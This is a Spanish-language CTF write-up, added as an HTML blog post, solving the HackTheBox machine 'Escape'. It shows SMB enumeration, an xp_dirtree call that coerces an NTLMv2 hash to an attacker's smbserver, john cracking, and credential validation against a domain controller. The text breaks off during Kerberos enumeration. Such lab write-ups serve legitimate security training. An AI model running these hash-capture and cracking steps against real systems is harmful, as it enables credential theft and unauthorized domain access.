@@ -1,0 +1,1146 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Escape (medium) | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="HackTheBox - Escape (medium)" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/machines/medium/2024/04/01/escape.html" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/machines/medium/2024/04/01/escape.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-04-01T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox - Escape (medium)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-04-01T00:00:00-06:00","datePublished":"2024-04-01T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"HackTheBox - Escape (medium)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/medium/2024/04/01/escape.html"},"url":"http://localhost:4000/hackthebox/machines/medium/2024/04/01/escape.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Escape (medium)</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-04-01T00:00:00-06:00" itemprop="datePublished">
+        Apr 1, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/80936664b3da83a92b28602e79e47d79.png" />
+</p>
+
+<ul>
+  <li>En este post vamos a estar resolviendo la maquina Escape de la plataforma de HackTheBox donde gracias a un archivo que encontramos por SMB podremos obtener credenciales e información sobre la base de datos para conectarnos con mssqlclient para así aprovecharnos de que podemos ejecutar un comando para obtener el Hash NTLMv2 de un usuario y conectarnos con evil-wirnm para la escalada de privilegios nos convertiremos en otro usuario para de hay aprovecharnos un template vulnerable y obtener el Hash del usuario Administrador.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.11.202
+PING 10.10.11.202 <span class="o">(</span>10.10.11.202<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.11.202: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>113 ms
+
+<span class="nt">---</span> 10.10.11.202 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 112.763/112.763/112.763/0.000 ms
+❯ whichSystem.py 10.10.11.202
+
+10.10.11.202 <span class="o">(</span>ttl -&gt; 127<span class="o">)</span>: Windows
+</code></pre></div></div>
+
+<h2 id="portscan">PortScan</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49681,55669 10.10.11.202 <span class="nt">-oN</span> targeted
+Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-06-16 12:18 CST
+Nmap scan report <span class="k">for </span>10.10.11.202
+Host is up <span class="o">(</span>0.12s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE    SERVICE       VERSION
+53/tcp    open     domain        Simple DNS Plus
+88/tcp    open     kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2023-06-17 02:18:11Z<span class="o">)</span>
+135/tcp   open     msrpc         Microsoft Windows RPC
+139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open     ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: sequel.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+|_ssl-date: 2023-06-17T02:19:43+00:00<span class="p">;</span> +7h59m59s from scanner time.
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.sequel.htb
+| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.sequel.htb
+| Not valid before: 2022-11-18T21:20:35
+|_Not valid after:  2023-11-18T21:20:35
+445/tcp   open     microsoft-ds?
+464/tcp   open     kpasswd5?
+593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: sequel.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+|_ssl-date: 2023-06-17T02:19:42+00:00<span class="p">;</span> +7h59m59s from scanner time.
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.sequel.htb
+| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.sequel.htb
+| Not valid before: 2022-11-18T21:20:35
+|_Not valid after:  2023-11-18T21:20:35
+1433/tcp  open     ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00<span class="p">;</span> RTM
+|_ms-sql-ntlm-info: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
+|_ms-sql-info: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
+| Not valid before: 2023-06-17T02:08:27
+|_Not valid after:  2053-06-17T02:08:27
+|_ssl-date: 2023-06-17T02:19:43+00:00<span class="p">;</span> +7h59m59s from scanner time.
+3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: sequel.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+|_ssl-date: 2023-06-17T02:19:43+00:00<span class="p">;</span> +7h59m59s from scanner time.
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.sequel.htb
+| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.sequel.htb
+| Not valid before: 2022-11-18T21:20:35
+|_Not valid after:  2023-11-18T21:20:35
+3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: sequel.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.sequel.htb
+| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.sequel.htb
+| Not valid before: 2022-11-18T21:20:35
+|_Not valid after:  2023-11-18T21:20:35
+|_ssl-date: 2023-06-17T02:19:42+00:00<span class="p">;</span> +7h59m58s from scanner time.
+5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open     mc-nmf        .NET Message Framing
+49667/tcp open     msrpc         Microsoft Windows RPC
+49681/tcp filtered unknown
+55669/tcp filtered unknown
+Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   <span class="nb">date</span>: 2023-06-17T02:19:01
+|_  start_date: N/A
+|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m58s
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+
+</code></pre></div></div>
+
+<h2 id="enumeracion">Enumeracion</h2>
+
+<ul>
+  <li>El escaneo de <strong>Nmap</strong> ya nos esta reportando 2 subdominos así que vamos a agregarlos al <strong>/etc/hosts</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"10.10.11.202 dc.sequel.htb sequel.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+10.10.11.202 dc.sequel.htb sequel.htb
+❯ ping <span class="nt">-c</span> 1 dc.sequel.htb
+PING dc.sequel.htb <span class="o">(</span>10.10.11.202<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from dc.sequel.htb <span class="o">(</span>10.10.11.202<span class="o">)</span>: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>113 ms
+
+<span class="nt">---</span> dc.sequel.htb ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 112.664/112.664/112.664/0.000 ms
+❯ ping <span class="nt">-c</span> 1 sequel.htb
+PING dc.sequel.htb <span class="o">(</span>10.10.11.202<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from dc.sequel.htb <span class="o">(</span>10.10.11.202<span class="o">)</span>: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>114 ms
+
+<span class="nt">---</span> dc.sequel.htb ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 113.908/113.908/113.908/0.000 ms
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a ver ante que estamos con la herramienta de <strong>crakmapexec</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.11.202
+SMB         10.10.11.202    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:sequel.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora mediante <strong>smbclient</strong> vamos a listar recursos compartidos por <strong>SMB</strong> empleando un <strong>Null Session</strong> por que no tenemos credenciales de ningún usuario aun.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-L</span> 10.10.11.202 <span class="nt">-N</span>
+
+	Sharename       Type      Comment
+	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>         Disk      Remote Admin
+	C<span class="nv">$ </span>             Disk      Default share
+	IPC<span class="nv">$ </span>           IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	Public          Disk      
+	SYSVOL          Disk      Logon server share 
+SMB1 disabled <span class="nt">--</span> no workgroup available
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos que hay un recurso que se llama <strong>Public</strong> así que vamos a ver si podemos acceder a el para ver que encontramos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient //10.10.11.202/Public <span class="nt">-N</span>
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
+  <span class="nb">.</span>                                   D        0  Sat Nov 19 05:51:25 2022
+  ..                                  D        0  Sat Nov 19 05:51:25 2022
+  SQL Server Procedures.pdf           A    49551  Fri Nov 18 07:39:43 2022
+
+		5184255 blocks of size 4096. 1474795 blocks available
+smb: <span class="se">\&gt;</span> 
+
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a descargarnos el archivo <strong>.pdf</strong> para ver cual es su contenido.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\&gt;</span> get <span class="s2">"SQL Server Procedures.pdf"</span>
+getting file <span class="se">\S</span>QL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf <span class="o">(</span>70.0 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 70.0 KiloBytes/sec<span class="o">)</span>
+smb: <span class="se">\&gt;</span> 
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a proceder a abrirlo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ open SQL<span class="se">\ </span>Server<span class="se">\ </span>Procedures.pdf &amp;&gt;/dev/null &amp; <span class="nb">disown</span>
+<span class="o">[</span>1] 37141
+</code></pre></div></div>
+
+<ul>
+  <li>Este es el contenido de la primera hoja.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/escape/web1.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Vamos que nos están diciendo que tuvieron un incidente con sus <strong>SQL Servers</strong> ademas nos están dando 2 usuarios <strong>Ryan y Brandon</strong>.</p>
+  </li>
+  <li>
+    <p>Este es el contenido de la segunda hoja y ya nos están dando una contraseña.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/escape/web2.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Vamos acceder ala base de datos empleando las credenciales que nos compartieron en el archivo <strong>PDF</strong> <code class="language-plaintext highlighter-rouge">PublicUser:GuestUserCantWrite1</code>.</p>
+  </li>
+  <li>
+    <p>Para eso vamos a usar la herramienta de <code class="language-plaintext highlighter-rouge">impacket</code> que es <code class="language-plaintext highlighter-rouge">mssqlclient</code>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-mssqlclient WORKGROUP/PublicUser:GuestUserCantWrite1@10.10.11.202
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: 16192
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DC<span class="se">\S</span>QLMOCK<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'master'</span><span class="nb">.</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DC<span class="se">\S</span>QLMOCK<span class="o">)</span>: Line 1: Changed language setting to us_english.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ACK: Result: 1 - Microsoft SQL Server <span class="o">(</span>150 7208<span class="o">)</span> 
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+SQL&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>Buscando información podemos ejecutar los siguientes comandos con el servicio.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL&gt; <span class="nb">help
+
+     </span>lcd <span class="o">{</span>path<span class="o">}</span>                 - changes the current <span class="nb">local </span>directory to <span class="o">{</span>path<span class="o">}</span>
+     <span class="nb">exit</span>                       - terminates the server process <span class="o">(</span>and this session<span class="o">)</span>
+     enable_xp_cmdshell         - you know what it means
+     disable_xp_cmdshell        - you know what it means
+     xp_cmdshell <span class="o">{</span>cmd<span class="o">}</span>          - executes cmd using xp_cmdshell
+     sp_start_job <span class="o">{</span>cmd<span class="o">}</span>         - executes cmd using the sql server agent <span class="o">(</span>blind<span class="o">)</span>
+     <span class="o">!</span> <span class="o">{</span>cmd<span class="o">}</span>                    - executes a <span class="nb">local </span>shell cmd
+     
+SQL&gt; 
+</code></pre></div></div>
+
+<h1 id="get-hash-ntlmv2">Get Hash NTLMv2</h1>
+
+<ul>
+  <li>Si buscamos en internet como podemos aprovecharnos de esto nos hablan sobre <strong>Microsoft SQL Server’s</strong> <a href="https://www.acunetix.com/blog/articles/sqli-part-6-out-of-band-sqli/">https://www.acunetix.com/blog/articles/sqli-part-6-out-of-band-sqli/</a>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/escape/web3.png" />
+</p>
+
+<ul>
+  <li>Lo que podemos hacer es usar <code class="language-plaintext highlighter-rouge">smbserver.py</code> para montar un recurso compartido a nivel de red y mediante la shell que tenemos con <strong>SQL</strong> hacer una petición a nuestro servidor para que cuando se autentique ver si nos llega algún <strong>hash</strong> <strong>NTLMv2</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbserver.py parrotsec <span class="nb">.</span> <span class="nt">-smb2support</span>
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora hacemos la petición al nombre del recurso que se llama <strong>parrotsec</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL&gt; xp_dirtree <span class="s1">'\\10.10.14.12\parrotsec'</span>
+subdirectory                                                                                                                                                                                                                                                            depth   
+
+<span class="nt">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span>   <span class="nt">-----------</span>   
+
+SQL&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>Y nos llega el <strong>Hash</strong> del usuario <code class="language-plaintext highlighter-rouge">sql_svc</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbserver.py parrotsec <span class="nb">.</span> <span class="nt">-smb2support</span>
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.10.11.202,51953<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>sequel<span class="se">\s</span>ql_svc,DC<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User DC<span class="se">\s</span>ql_svc authenticated successfully
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> sql_svc::sequel:aaaaaaaaaaaaaaaa:fdf163a231e81c71f28d4042c0abb102:0101000000000000807c9e0098a0d90109e0928876f6cc7a00000000010010004c0057005a0042006600510071005500030010004c0057005a00420066005100710055000200100068006b00520064004d00630064006a000400100068006b00520064004d00630064006a0007000800807c9e0098a0d90106000400020000000800300030000000000000000000000000300000de8f02f9822bda24a4798b75e04084b7ed4eee42dd1ae2ef007a6b34d97f78090a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310032000000000000000000
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closing down connection <span class="o">(</span>10.10.11.202,51953<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Remaining connections <span class="o">[]</span>
+
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a crekearlo con <strong>john</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ catn <span class="nb">hash
+</span>sql_svc::sequel:aaaaaaaaaaaaaaaa:fdf163a231e81c71f28d4042c0abb102:0101000000000000807c9e0098a0d90109e0928876f6cc7a00000000010010004c0057005a0042006600510071005500030010004c0057005a00420066005100710055000200100068006b00520064004d00630064006a000400100068006b00520064004d00630064006a0007000800807c9e0098a0d90106000400020000000800300030000000000000000000000000300000de8f02f9822bda24a4798b75e04084b7ed4eee42dd1ae2ef007a6b34d97f78090a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310032000000000000000000
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos la contraseña.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
+</span>Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+REGGIE1234ronnie <span class="o">(</span>sql_svc<span class="o">)</span>
+1g 0:00:00:14 DONE <span class="o">(</span>2023-06-16 15:20<span class="o">)</span> 0.06811g/s 728937p/s 728937c/s 728937C/s REINLY..REDMAN69
+Use the <span class="s2">"--show --format=netntlmv2"</span> options to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p><strong>sql_svc:REGGIE1234ronnie</strong>.</p>
+  </li>
+  <li>
+    <p>Si verificamos las credenciales para ver si podemos conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> vemos que las credenciales son correctas.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec winrm 10.10.11.202 <span class="nt">-u</span> <span class="s1">'sql_svc'</span> <span class="nt">-p</span> <span class="s1">'REGGIE1234ronnie'</span>
+SMB         10.10.11.202    5985   DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:sequel.htb<span class="o">)</span>
+HTTP        10.10.11.202    5985   DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.11.202:5985/wsman
+WINRM       10.10.11.202    5985   DC               <span class="o">[</span>+] sequel.htb<span class="se">\s</span>ql_svc:REGGIE1234ronnie <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Antes de conectarnos ala maquina victima lo que podemos hacer es conectarnos con <code class="language-plaintext highlighter-rouge">rpcclient</code> para enumerar mas usuarios del dominio por podemos ver si reutilizan la contraseña que tenemos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient 10.10.11.202 <span class="nt">-U</span> <span class="s1">'sql_svc%REGGIE1234ronnie'</span> <span class="nt">-c</span> enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[Tom.Henn] rid:[0x44f]
+user:[Brandon.Brown] rid:[0x450]
+user:[Ryan.Cooper] rid:[0x451]
+user:[sql_svc] rid:[0x452]
+user:[James.Roberts] rid:[0x453]
+user:[Nicole.Thompson] rid:[0x454]
+</code></pre></div></div>
+
+<ul>
+  <li>También podemos hacerlo de esta manera.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.11.202 <span class="nt">-u</span> <span class="s1">'sql_svc'</span> <span class="nt">-p</span> <span class="s1">'REGGIE1234ronnie'</span> <span class="nt">--users</span> | <span class="nb">awk</span> <span class="s1">'{print $5}'</span> | <span class="nb">grep </span>sequel
+sequel.htb<span class="se">\N</span>icole.Thompson
+sequel.htb<span class="se">\J</span>ames.Roberts
+sequel.htb<span class="se">\s</span>ql_svc
+sequel.htb<span class="se">\R</span>yan.Cooper
+sequel.htb<span class="se">\B</span>randon.Brown
+sequel.htb<span class="se">\T</span>om.Henn
+sequel.htb<span class="se">\k</span>rbtgt
+sequel.htb<span class="se">\G</span>uest
+sequel.htb<span class="se">\A</span>dministrator
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a meterlos a una lista.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat users</span>
+───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: <span class="nb">users</span>
+───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ N.Thompson
+   2   │ J.Roberts
+   3   │ sql_svc
+   4   │ R.Cooper
+   5   │ B.Brown
+   6   │ T.Henn
+   7   │ krbtgt
+   8   │ Guest
+   9   │ Administrator
+───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</code></pre></div></div>
+
+<ul>
+  <li>Si probamos con <code class="language-plaintext highlighter-rouge">kerberos</code> nos dice esto así que lo bueno vamos a conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ./kerbrute userenum <span class="nb">users</span> <span class="nt">--dc</span> dc.sequel.htb <span class="nt">-d</span> sequel.htb
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/                                        
+
+Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 06/16/23 - Ronnie Flathers @ropnop
+
+2023/06/16 15:33:02 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
+2023/06/16 15:33:02 <span class="o">&gt;</span>  	dc.sequel.htb:88
+
+2023/06/16 15:33:02 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	sql_svc@sequel.htb
+2023/06/16 15:33:02 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Guest@sequel.htb
+2023/06/16 15:33:02 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Administrator@sequel.htb
+2023/06/16 15:33:02 <span class="o">&gt;</span>  Done! Tested 9 usernames <span class="o">(</span>3 valid<span class="o">)</span> <span class="k">in </span>0.150 seconds
+❯ GetNPUsers.py sequel.htb/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> <span class="nb">users
+</span>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+<span class="o">[</span>-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="o">(</span>Client not found <span class="k">in </span>Kerberos database<span class="o">)</span>
+<span class="o">[</span>-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="o">(</span>Client not found <span class="k">in </span>Kerberos database<span class="o">)</span>
+<span class="o">[</span>-] User sql_svc doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
